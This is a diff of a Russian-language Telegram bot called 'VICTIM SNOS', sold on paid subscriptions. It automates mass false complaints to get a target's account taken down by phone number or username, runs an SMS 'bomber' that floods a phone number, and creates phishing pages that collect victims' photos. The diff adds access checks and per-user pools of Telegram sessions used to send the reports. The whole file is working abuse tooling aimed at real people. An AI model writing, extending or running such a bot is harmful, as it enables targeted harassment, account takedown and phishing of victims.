     full_text = f"<b>🔱 VICTIM SNOS</b>\n\n{text}"
     
     try:
@@ -945,7 +892,6 @@ async def send_message_with_banner(
     except:
         pass
     
-    # Если нет баннера или ошибка - отправляем текст
     if hasattr(target, 'answer'):
         return await target.answer(full_text, reply_markup=markup)
     else:
@@ -955,81 +901,64 @@ async def send_message_with_banner(
             reply_markup=markup
         )
 
-# ---------- ОБРАБОТЧИКИ КОМАНД ----------
+# ---------- ОБРАБОТЧИКИ ----------
 @dp.message(Command("start"))
 async def cmd_start(msg: types.Message):
-    """Обработчик /start"""
     user_id = msg.from_user.id
     await msg.delete()
     
-    # Проверка подписки на канал
-    if not await check_channel_subscription(user_id):
-        await send_message_with_banner(
-            msg,
-            f"⚠️ Для использования бота подпишитесь на канал:\n\n{CHANNEL_URL}"
-        )
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(user_id, msg):
         return
     
-    # Проверка доступа
-    if not is_user_allowed(user_id):
-        await send_message_with_banner(
-            msg,
-            f"❌ Доступ запрещен.\n\n"
-            f"Ваш ID: <code>{user_id}</code>\n\n"
-            f"Приобретите доступ в меню ниже:",
-            get_purchase_menu()
-        )
-        return
+    pool = await get_or_create_user_pool(user_id)
     
-    # Проверяем готовность пула сессий
-    if not global_session_pool.is_ready:
-        asyncio.create_task(initialize_session_pool())
+    if not pool.is_ready:
         await send_message_with_banner(
             msg,
-            "🔄 Инициализация сессий...\nПожалуйста, подождите минуту.",
+            f"🔄 Создание сессий...\n"
+            f"Прогресс: {pool.creation_progress:.1f}%\n\n"
+            f"Это займет около 2-3 минут.",
             InlineKeyboardMarkup(inline_keyboard=[
-                [create_button("🔄 Проверить готовность", "check_ready")]
+                [create_button("🔄 Проверить", f"check_sessions_{user_id}")]
             ])
         )
+        
+        asyncio.create_task(initialize_user_sessions(user_id))
         return
     
-    stats = global_session_pool.get_stats()
+    stats = pool.get_stats()
     await send_message_with_banner(
         msg,
         f"✅ Бот готов к работе\n"
-        f"📊 Доступно сессий: {stats['available']}/{stats['total']}",
+        f"📊 Ваши сессии: {stats['available']}/{stats['total']}",
         get_main_menu(user_id)
     )
 
-@dp.callback_query(F.data == "check_ready")
-async def check_ready(cb: types.CallbackQuery):
-    """Проверка готовности пула"""
-    if global_session_pool.is_ready:
-        stats = global_session_pool.get_stats()
-        await cb.message.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                   f"✅ Пул сессий готов!\n"
-                   f"📊 Доступно: {stats['available']}/{stats['total']}",
-            reply_markup=get_main_menu(cb.from_user.id)
-        )
-    else:
-        await cb.answer("⏳ Сессии еще создаются...", show_alert=True)
-        await asyncio.sleep(2)
-        await check_ready(cb)
+@dp.callback_query(F.data == "main_menu")
+async def main_menu_handler(cb: types.CallbackQuery, state: FSMContext):
+    await state.clear()
+    
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
+    await cb.message.edit_caption(
+        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:",
+        reply_markup=get_main_menu(cb.from_user.id)
+    )
 
 @dp.callback_query(F.data == "snos_menu")
 async def snos_menu(cb: types.CallbackQuery):
-    """Меню сноса"""
-    # Проверка кулдауна
-    can_attack, remaining = await check_cooldown(cb.from_user.id)
-    if not can_attack:
-        await cb.answer(
-            f"⏳ Подождите {int(remaining)} сек. перед следующей атакой",
-            show_alert=True
-        )
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
         return
     
-    # Проверка активных атак
+    can_attack, remaining = await check_cooldown(cb.from_user.id)
+    if not can_attack:
+        await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
+        return
+    
     if cb.from_user.id in active_attacks:
         await cb.answer("❌ У вас уже есть активная атака!", show_alert=True)
         return
@@ -1041,21 +970,20 @@ async def snos_menu(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "snos_phone")
 async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
-    """Начало сноса по номеру"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
     user_lock = await get_user_lock(cb.from_user.id)
     
     async with user_lock:
-        # Проверки
         if cb.from_user.id in active_attacks:
             await cb.answer("❌ Активная атака уже идет!", show_alert=True)
             return
         
         can_attack, remaining = await check_cooldown(cb.from_user.id)
         if not can_attack:
-            await cb.answer(
-                f"⏳ Подождите {int(remaining)} сек.",
-                show_alert=True
-            )
+            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
             return
     
     await state.set_state(AttackState.waiting_phone)
@@ -1074,7 +1002,10 @@ async def snos_phone_start(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_phone))
 async def snos_phone_received(msg: types.Message, state: FSMContext):
-    """Получен номер телефона"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     phone = msg.text.strip()
     await state.update_data(phone=phone)
     await state.set_state(AttackState.waiting_count)
@@ -1088,17 +1019,17 @@ async def snos_phone_received(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def snos_count_received(msg: types.Message, state: FSMContext):
-    """Получено количество раундов"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     try:
         rounds = int(msg.text.strip())
         if rounds < 1 or rounds > MAX_ROUNDS:
             raise ValueError()
     except:
         await msg.delete()
-        await send_message_with_banner(
-            msg,
-            f"❌ Введите число от 1 до {MAX_ROUNDS}!"
-        )
+        await send_message_with_banner(msg, f"❌ Введите число от 1 до {MAX_ROUNDS}!")
         return
     
     data = await state.get_data()
@@ -1108,7 +1039,6 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.delete()
     
-    # Устанавливаем кулдаун и блокировку
     user_lock = await get_user_lock(user_id)
     
     async with user_lock:
@@ -1119,26 +1049,26 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
         stop_event = asyncio.Event()
         active_attacks[user_id] = stop_event
     
-    # Отправляем начальное сообщение
     status_msg = await send_message_with_banner(
         msg,
         f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
         f"📱 Телефон: <code>{phone}</code>\n"
         f"🔄 Раунд: 0/{rounds}\n"
-        f"📤 Отправлено: 0\n\n"
-        f"<i>Используется до {REQUESTS_PER_ROUND} сессий на раунд</i>"
+        f"📤 Отправлено: 0"
     )
     
-    # Callback для обновления прогресса
     async def update_progress(current: int, total: int, sent: int):
         try:
+            pool = user_pools.get(user_id)
+            stats = pool.get_stats() if pool else {"available": 0, "total": 0}
+            
             await status_msg.edit_caption(
                 caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                        f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                        f"📱 Телефон: <code>{phone}</code>\n"
                        f"🔄 Раунд: {current}/{total}\n"
                        f"📤 Отправлено: {sent}\n"
-                       f"⚡ Сессий: {REQUESTS_PER_ROUND}/раунд",
+                       f"📊 Сессий: {stats['available']}/{stats['total']}",
                 reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                     [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                 ])
@@ -1146,7 +1076,6 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
         except:
             pass
     
-    # Запускаем атаку
     try:
         total_sent = await snos_attack_phone(
             user_id,
@@ -1156,17 +1085,14 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
             update_progress
         )
         
-        # Устанавливаем кулдаун
         set_cooldown(user_id)
         
-        # Финальное сообщение
         await status_msg.edit_caption(
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                    f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                    f"📱 Телефон: <code>{phone}</code>\n"
-                   f"📤 Всего отправлено: <b>{total_sent}</b>\n"
-                   f"🔄 Раундов: {rounds}\n\n"
-                   f"⏳ Кулдаун: 5 минут",
+                   f"📤 Отправлено: <b>{total_sent}</b>\n"
+                   f"🔄 Раундов: {rounds}",
             reply_markup=get_main_menu(user_id)
         )
         
@@ -1174,8 +1100,7 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
         logger.error(f"Attack error: {e}")
         await status_msg.edit_caption(
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                   f"❌ <b>ОШИБКА</b>\n\n"
-                   f"Произошла ошибка при выполнении атаки",
+                   f"❌ <b>ОШИБКА</b>",
             reply_markup=get_main_menu(user_id)
         )
     finally:
@@ -1184,7 +1109,10 @@ async def snos_count_received(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "snos_username")
 async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
-    """Начало сноса по username"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
     user_lock = await get_user_lock(cb.from_user.id)
     
     async with user_lock:
@@ -1194,10 +1122,7 @@ async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
         
         can_attack, remaining = await check_cooldown(cb.from_user.id)
         if not can_attack:
-            await cb.answer(
-                f"⏳ Подождите {int(remaining)} сек.",
-                show_alert=True
-            )
+            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
             return
     
     await state.set_state(AttackState.waiting_username)
@@ -1216,7 +1141,10 @@ async def snos_username_start(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_username))
 async def snos_username_received(msg: types.Message, state: FSMContext):
-    """Получен username"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     username = msg.text.strip().replace("@", "")
     await state.update_data(username=username)
     await state.set_state(AttackState.waiting_count)
@@ -1230,7 +1158,10 @@ async def snos_username_received(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def snos_username_count(msg: types.Message, state: FSMContext):
-    """Получено количество раундов для username"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     try:
         rounds = int(msg.text.strip())
         if rounds < 1 or rounds > MAX_ROUNDS:
@@ -1247,7 +1178,6 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.delete()
     
-    # Блокировка
     user_lock = await get_user_lock(user_id)
     
     async with user_lock:
@@ -1258,7 +1188,6 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
         stop_event = asyncio.Event()
         active_attacks[user_id] = stop_event
     
-    # Статус сообщение
     status_msg = await send_message_with_banner(
         msg,
         f"🎯 <b>СНОС ЗАПУЩЕН</b>\n\n"
@@ -1269,12 +1198,16 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
     
     async def update_progress(current: int, total: int, reports: int):
         try:
+            pool = user_pools.get(user_id)
+            stats = pool.get_stats() if pool else {"available": 0, "total": 0}
+            
             await status_msg.edit_caption(
                 caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                        f"🎯 <b>СНОС АКТИВЕН</b>\n\n"
                        f"👤 Username: @{username}\n"
                        f"🔄 Раунд: {current}/{total}\n"
-                       f"📤 Жалоб: {reports}",
+                       f"📤 Жалоб: {reports}\n"
+                       f"📊 Сессий: {stats['available']}/{stats['total']}",
                 reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                     [create_button("⏹ ОСТАНОВИТЬ", "stop_attack")]
                 ])
@@ -1282,7 +1215,6 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
         except:
             pass
     
-    # Запуск атаки
     try:
         total_reports = await snos_attack_username(
             user_id,
@@ -1298,7 +1230,7 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                    f"✅ <b>СНОС ЗАВЕРШЕН</b>\n\n"
                    f"👤 Username: @{username}\n"
-                   f"📤 Всего жалоб: <b>{total_reports}</b>\n"
+                   f"📤 Жалоб: <b>{total_reports}</b>\n"
                    f"🔄 Раундов: {rounds}",
             reply_markup=get_main_menu(user_id)
         )
@@ -1314,89 +1246,12 @@ async def snos_username_count(msg: types.Message, state: FSMContext):
         if user_id in active_attacks:
             del active_attacks[user_id]
 
-@dp.callback_query(F.data == "report_message")
-async def report_message_start(cb: types.CallbackQuery, state: FSMContext):
-    """Начало жалобы на сообщение"""
-    user_lock = await get_user_lock(cb.from_user.id)
-    
-    async with user_lock:
-        if cb.from_user.id in active_attacks:
-            await cb.answer("❌ Активная атака уже идет!", show_alert=True)
-            return
-        
-        can_attack, remaining = await check_cooldown(cb.from_user.id)
-        if not can_attack:
-            await cb.answer(
-                f"⏳ Подождите {int(remaining)} сек.",
-                show_alert=True
-            )
-            return
-        
-        active_attacks[cb.from_user.id] = asyncio.Event()
-    
-    await state.set_state(AttackState.waiting_link)
-    await cb.message.delete()
-    
-    cancel_kb = InlineKeyboardMarkup(inline_keyboard=[
-        [create_button("❌ Отмена", "snos_menu")]
-    ])
-    
-    await cb.message.answer(
-        "<b>🔱 VICTIM SNOS</b>\n\n"
-        "💬 Введите ссылку на сообщение:\n"
-        "<i>Пример: https://t.me/channel/123</i>",
-        reply_markup=cancel_kb
-    )
-
-@dp.message(StateFilter(AttackState.waiting_link))
-async def report_message_link(msg: types.Message, state: FSMContext):
-    """Получена ссылка на сообщение"""
-    link = msg.text.strip()
-    user_id = msg.from_user.id
-    
-    await state.clear()
-    await msg.delete()
-    
-    status_msg = await send_message_with_banner(
-        msg,
-        f"📤 <b>ОТПРАВКА ЖАЛОБ</b>\n\n"
-        f"🔗 Ссылка: {link}\n"
-        f"⏳ Обработка..."
-    )
-    
-    try:
-        reports, error = await mass_report_message(user_id, link)
-        set_cooldown(user_id)
-        
-        if error:
-            await status_msg.edit_caption(
-                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                       f"❌ <b>ОШИБКА</b>\n\n"
-                       f"{error}",
-                reply_markup=get_main_menu(user_id)
-            )
-        else:
-            await status_msg.edit_caption(
-                caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                       f"✅ <b>ЖАЛОБЫ ОТПРАВЛЕНЫ</b>\n\n"
-                       f"📤 Отправлено: <b>{reports}</b> жалоб",
-                reply_markup=get_main_menu(user_id)
-            )
-            
-    except Exception as e:
-        await status_msg.edit_caption(
-            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
-                   f"❌ <b>ОШИБКА</b>\n\n"
-                   f"Произошла ошибка",
-            reply_markup=get_main_menu(user_id)
-        )
-    finally:
-        if user_id in active_attacks:
-            del active_attacks[user_id]
-
 @dp.callback_query(F.data == "bomber_menu")
 async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
-    """Меню бомбера"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
     user_lock = await get_user_lock(cb.from_user.id)
     
     async with user_lock:
@@ -1406,10 +1261,7 @@ async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
         
         can_attack, remaining = await check_cooldown(cb.from_user.id)
         if not can_attack:
-            await cb.answer(
-                f"⏳ Подождите {int(remaining)} сек.",
-                show_alert=True
-            )
+            await cb.answer(f"⏳ Подождите {int(remaining)} сек.", show_alert=True)
             return
     
     await state.set_state(AttackState.waiting_phone)
@@ -1428,7 +1280,10 @@ async def bomber_menu(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_phone))
 async def bomber_phone(msg: types.Message, state: FSMContext):
-    """Получен номер для бомбера"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     phone = msg.text.strip()
     await state.update_data(phone=phone)
     await state.set_state(AttackState.waiting_count)
@@ -1442,7 +1297,10 @@ async def bomber_phone(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_count))
 async def bomber_count(msg: types.Message, state: FSMContext):
-    """Получено количество раундов для бомбера"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     try:
         rounds = int(msg.text.strip())
         if rounds < 1 or rounds > 5:
@@ -1459,7 +1317,6 @@ async def bomber_count(msg: types.Message, state: FSMContext):
     await state.clear()
     await msg.delete()
     
-    # Блокировка
     user_lock = await get_user_lock(user_id)
     
     async with user_lock:
@@ -1508,7 +1365,7 @@ async def bomber_count(msg: types.Message, state: FSMContext):
             caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                    f"✅ <b>БОМБЕР ЗАВЕРШЕН</b>\n\n"
                    f"📱 Телефон: <code>{phone}</code>\n"
-                   f"📨 Всего SMS: <b>{total_sent}</b>\n"
+                   f"📨 SMS: <b>{total_sent}</b>\n"
                    f"🔄 Раундов: {rounds}",
             reply_markup=get_main_menu(user_id)
         )
@@ -1525,7 +1382,10 @@ async def bomber_count(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "phish_menu")
 async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
-    """Меню фишинга"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
     await state.set_state(AttackState.waiting_title)
     await cb.message.delete()
     
@@ -1543,7 +1403,10 @@ async def phish_menu(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AttackState.waiting_title))
 async def phish_title(msg: types.Message, state: FSMContext):
-    """Создание фишинговой страницы"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(msg.from_user.id, msg):
+        return
+    
     title = msg.text.strip()
     user_id = msg.from_user.id
     
@@ -1578,7 +1441,6 @@ async def phish_title(msg: types.Message, state: FSMContext):
 
 @dp.message(F.photo)
 async def handle_phish_photo(msg: types.Message):
-    """Обработка фото от фишинга"""
     if msg.caption:
         for page_id, page in list(phish_pages.items()):
             if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
@@ -1591,7 +1453,6 @@ async def handle_phish_photo(msg: types.Message):
 
 @dp.callback_query(F.data == "purchase_menu")
 async def purchase_menu(cb: types.CallbackQuery):
-    """Меню покупки"""
     buttons = [
         [("💎 30 дней - 100₽", "buy_30d")],
         [("💎 60 дней - 200₽", "buy_60d")],
@@ -1609,7 +1470,6 @@ async def purchase_menu(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data.startswith("buy_"))
 async def buy_subscription(cb: types.CallbackQuery):
-    """Покупка подписки"""
     duration = cb.data.replace("buy_", "")
     
     prices = {
@@ -1641,12 +1501,10 @@ async def buy_subscription(cb: types.CallbackQuery):
 
 @dp.pre_checkout_query()
 async def process_pre_checkout(pre_checkout_query: PreCheckoutQuery):
-    """Обработка pre-checkout"""
     await bot.answer_pre_checkout_query(pre_checkout_query.id, ok=True)
 
 @dp.message(F.successful_payment)
 async def process_successful_payment(msg: types.Message):
-    """Успешная оплата"""
     payload = msg.successful_payment.invoice_payload
     
     if payload.startswith("sub_"):
@@ -1668,7 +1526,6 @@ async def process_successful_payment(msg: types.Message):
 
 @dp.callback_query(F.data == "use_promo")
 async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
-    """Активация промокода"""
     await state.set_state(PurchaseState.waiting_promo)
     await cb.message.delete()
     
@@ -1682,7 +1539,6 @@ async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(PurchaseState.waiting_promo))
 async def process_promo(msg: types.Message, state: FSMContext):
-    """Обработка промокода"""
     code = msg.text.strip().upper()
     await msg.delete()
     await state.clear()
@@ -1715,11 +1571,13 @@ async def process_promo(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "status")
 async def status(cb: types.CallbackQuery):
-    """Статус пользователя"""
+    # ПРОВЕРКА ДОСТУПА
+    if not await check_access_and_subscription(cb.from_user.id, cb):
+        return
+    
     user_id = cb.from_user.id
     user_id_str = str(user_id)
     
-    # Информация о подписке
     if user_id_str in ALLOWED_USERS:
         expire = ALLOWED_USERS[user_id_str].get("expire_date", "неизвестно")
         if expire != "forever":
@@ -1732,23 +1590,26 @@ async def status(cb: types.CallbackQuery):
     else:
         expire = "Нет доступа"
     
-    # Статистика пула
-    pool_stats = global_session_pool.get_stats()
+    pool = user_pools.get(user_id)
+    if pool and pool.is_ready:
+        stats = pool.get_stats()
+        sessions_text = f"📱 Сессий: {stats['available']}/{stats['total']}\n"
+        sessions_text += f"💚 Здоровых: {stats['healthy']}"
+    else:
+        progress = pool.creation_progress if pool else 0
+        sessions_text = f"🔄 Создание: {progress:.1f}%"
     
-    # Кулдаун
     can_attack, remaining = await check_cooldown(user_id)
-    cooldown_text = f"Готов к атаке" if can_attack else f"Кулдаун: {int(remaining)} сек"
+    cooldown_text = f"✅ Готов к атаке" if can_attack else f"⏳ Кулдаун: {int(remaining)} сек"
     
     await cb.message.edit_caption(
         caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
                f"<b>📊 СТАТУС</b>\n\n"
                f"🆔 ID: <code>{user_id}</code>\n"
                f"📅 Подписка: {expire}\n"
-               f"⏰ {cooldown_text}\n\n"
-               f"<b>📈 ПУЛ СЕССИЙ</b>\n"
-               f"📱 Всего: {pool_stats['total']}\n"
-               f"✅ Доступно: {pool_stats['available']}\n"
-               f"💚 Здоровых: {pool_stats['healthy']}",
+               f"{cooldown_text}\n\n"
+               f"<b>📈 СЕССИИ</b>\n"
+               f"{sessions_text}",
         reply_markup=InlineKeyboardMarkup(inline_keyboard=[
             [create_button("◀️ НАЗАД", "main_menu")]
         ])
@@ -1756,7 +1617,6 @@ async def status(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "stop")
 async def stop_attack(cb: types.CallbackQuery):
-    """Остановка атаки"""
     user_id = cb.from_user.id
     
     if user_id in active_attacks:
@@ -1768,7 +1628,6 @@ async def stop_attack(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "stop_attack")
 async def stop_attack_button(cb: types.CallbackQuery):
-    """Остановка атаки через кнопку"""
     await stop_attack(cb)
     await cb.message.edit_caption(
         caption="<b>🔱 VICTIM SNOS</b>\n\n"
@@ -1776,22 +1635,38 @@ async def stop_attack_button(cb: types.CallbackQuery):
         reply_markup=get_main_menu(cb.from_user.id)
     )
 
-@dp.callback_query(F.data == "main_menu")
-async def main_menu(cb: types.CallbackQuery, state: FSMContext):
-    """Главное меню"""
-    await state.clear()
-    await cb.message.edit_caption(
-        caption="<b>🔱 VICTIM SNOS</b>\n\nВыберите действие:",
-        reply_markup=get_main_menu(cb.from_user.id)
-    )
+@dp.callback_query(F.data.startswith("check_sessions_"))
+async def check_sessions(cb: types.CallbackQuery):
+    user_id = int(cb.data.split("_")[2])
+    
+    if user_id != cb.from_user.id:
+        await cb.answer("Это не ваши сессии!", show_alert=True)
+        return
+    
+    pool = user_pools.get(user_id)
+    
+    if pool and pool.is_ready:
+        stats = pool.get_stats()
+        await cb.message.edit_caption(
+            caption=f"<b>🔱 VICTIM SNOS</b>\n\n"
+                   f"✅ Сессии готовы!\n"
+                   f"📊 Доступно: {stats['available']}/{stats['total']}",
+            reply_markup=get_main_menu(user_id)
+        )
+    else:
+        progress = pool.creation_progress if pool else 0
+        await cb.answer(f"Прогресс: {progress:.1f}%", show_alert=True)
 
 # ---------- АДМИН ПАНЕЛЬ ----------
 @dp.message(Command("admin"))
 async def admin_cmd(msg: types.Message):
-    """Админ панель"""
     await msg.delete()
     
     if msg.from_user.id != ADMIN_ID:
+        await send_message_with_banner(
+            msg,
+            "❌ У вас нет доступа к админ-панели"
+        )
         return
     
     buttons = [
@@ -1811,8 +1686,8 @@ async def admin_cmd(msg: types.Message):
 
 @dp.callback_query(F.data == "admin_add")
 async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
-    """Добавление пользователя"""
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Нет доступа", show_alert=True)
         return
     
     await state.set_state(AdminState.waiting_user_id)
@@ -1828,7 +1703,6 @@ async def admin_add_start(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_user_id))
 async def admin_add_user(msg: types.Message, state: FSMContext):
-    """Обработка ID пользователя"""
     if msg.from_user.id != ADMIN_ID:
         return
     
@@ -1850,8 +1724,8 @@ async def admin_add_user(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "admin_create_promo")
 async def admin_promo_start(cb: types.CallbackQuery, state: FSMContext):
-    """Создание промокода"""
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Нет доступа", show_alert=True)
         return
     
     await state.set_state(AdminState.waiting_promo_code)
@@ -1867,7 +1741,6 @@ async def admin_promo_start(cb: types.CallbackQuery, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_promo_code))
 async def admin_promo_code(msg: types.Message, state: FSMContext):
-    """Получен код промокода"""
     if msg.from_user.id != ADMIN_ID:
         return
     
@@ -1880,7 +1753,6 @@ async def admin_promo_code(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_promo_days))
 async def admin_promo_days(msg: types.Message, state: FSMContext):
-    """Получены дни"""
     if msg.from_user.id != ADMIN_ID:
         return
     
@@ -1897,7 +1769,6 @@ async def admin_promo_days(msg: types.Message, state: FSMContext):
 
 @dp.message(StateFilter(AdminState.waiting_promo_uses))
 async def admin_promo_uses(msg: types.Message, state: FSMContext):
-    """Создание промокода"""
     if msg.from_user.id != ADMIN_ID:
         return
     
@@ -1928,8 +1799,8 @@ async def admin_promo_uses(msg: types.Message, state: FSMContext):
 
 @dp.callback_query(F.data == "admin_remove")
 async def admin_remove_menu(cb: types.CallbackQuery):
-    """Меню удаления пользователей"""
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Нет доступа", show_alert=True)
         return
     
     if not ALLOWED_USERS:
@@ -1949,7 +1820,6 @@ async def admin_remove_menu(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data.startswith("remove_"))
 async def admin_remove_user(cb: types.CallbackQuery):
-    """Удаление пользователя"""
     if cb.from_user.id != ADMIN_ID:
         return
     
@@ -1957,6 +1827,19 @@ async def admin_remove_user(cb: types.CallbackQuery):
     if user_id in ALLOWED_USERS:
         del ALLOWED_USERS[user_id]
         save_allowed_users()
+        
+        if int(user_id) in user_pools:
+            pool = user_pools[int(user_id)]
+            for session in pool.sessions:
+                try:
+                    await session.client.disconnect()
+                except:
+                    pass
+            del user_pools[int(user_id)]
+            
+            session_dir = f"sessions/user_{user_id}"
+            if os.path.exists(session_dir):
+                shutil.rmtree(session_dir)
     
     await cb.message.edit_caption(
         caption=f"<b>👑 АДМИН</b>\n\n"
@@ -1966,8 +1849,8 @@ async def admin_remove_user(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_list")
 async def admin_list(cb: types.CallbackQuery):
-    """Список пользователей"""
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Нет доступа", show_alert=True)
         return
     
     text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
@@ -1993,23 +1876,21 @@ async def admin_list(cb: types.CallbackQuery):
 
 @dp.callback_query(F.data == "admin_stats")
 async def admin_stats(cb: types.CallbackQuery):
-    """Статистика для админа"""
     if cb.from_user.id != ADMIN_ID:
+        await cb.answer("Нет доступа", show_alert=True)
         return
     
-    pool_stats = global_session_pool.get_stats()
+    total_sessions = sum(len(pool.sessions) for pool in user_pools.values())
+    ready_pools = sum(1 for pool in user_pools.values() if pool.is_ready)
     active_attacks_count = len(active_attacks)
     users_count = len(ALLOWED_USERS)
     
     text = (
         f"<b>👑 СТАТИСТИКА</b>\n\n"
         f"👥 Пользователей: {users_count}\n"
-        f"⚔️ Активных атак: {active_attacks_count}\n\n"
-        f"<b>📊 ПУЛ СЕССИЙ</b>\n"
-        f"📱 Всего: {pool_stats['total']}\n"
-        f"✅ Доступно: {pool_stats['available']}\n"
-        f"💚 Здоровых: {pool_stats['healthy']}\n"
-        f"🔄 Готов: {'Да' if pool_stats['ready'] else 'Нет'}"
+        f"⚔️ Активных атак: {active_attacks_count}\n"
+        f"📱 Всего сессий: {total_sessions}\n"
+        f"✅ Готовых пулов: {ready_pools}/{len(user_pools)}\n"
     )
     
     await cb.message.edit_caption(
@@ -2020,37 +1901,21 @@ async def admin_stats(cb: types.CallbackQuery):
     )
 
 def get_admin_menu() -> InlineKeyboardMarkup:
-    """Клавиатура админ меню"""
     buttons = [
         [create_button("◀️ НАЗАД", "admin_menu")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=buttons)
 
-def get_purchase_menu() -> InlineKeyboardMarkup:
-    """Клавиатура меню покупки"""
-    buttons = [
-        [create_button("💰 КУПИТЬ ДОСТУП", "purchase_menu")]
-    ]
-    return InlineKeyboardMarkup(inline_keyboard=buttons)
-
 # ---------- ЗАПУСК ----------
 async def on_startup():
-    """Действия при запуске"""
     load_allowed_users()
     load_promo_codes()
     
     os.makedirs("sessions", exist_ok=True)
     
-    # Запускаем инициализацию пула в фоне
-    asyncio.create_task(initialize_session_pool())
-    
-    # Запускаем поддержку пула
-    asyncio.create_task(maintain_session_pool())
-    
-    logger.info("Bot started!")
+    logger.info("Bot started! Access control ENABLED")
 
 async def main():
-    """Главная функция"""
     await on_startup()
     
     await bot.delete_webhook(drop_pending_updates=True)
